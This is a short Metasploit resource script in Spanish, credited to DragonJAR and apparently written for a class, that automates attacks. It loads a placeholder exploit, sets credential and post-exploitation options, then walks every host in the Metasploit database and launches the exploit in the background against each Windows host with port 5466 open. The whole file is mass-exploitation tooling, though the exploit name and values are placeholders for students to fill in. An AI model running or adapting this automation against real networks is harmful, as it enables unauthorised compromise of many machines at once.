
<ruby>
# Automatizando Metasploit
# DragonJAR 
run_single("use AQUIEXPLOIT") #Cambiar por Exploit a Gusto
run_single("set VARIABLE USUSARIO") #Cambiar por variable a definir en el exploit
run_single("set VARIABL CLAVE")     #Cambiar por variable a definir en el exploit
run_single("set AutoRunScript 'multi_console_command -rc /RUTAAQUI/DMA - ejecutar.rc'")


framework.db.workspace.hosts.each do |host| #Lee los host que estan en la base de datos
  host.services.each do |servicio|
    if servicio.port == 5466 and host.os_name =~ /Windows/i #Filtramos los host para el servicio de nuestro exploit
      run_single("set RHOST #{host.address}") # Se define en la variable del exploit el host que encaja en el filtro
      run_single("run -z") #Se ejecuta a segundo plano para continuar con el siguiente host
    end
  end
end

print_good("Felicidades ya ejecustaste el script aprendido en clase" )
</ruby>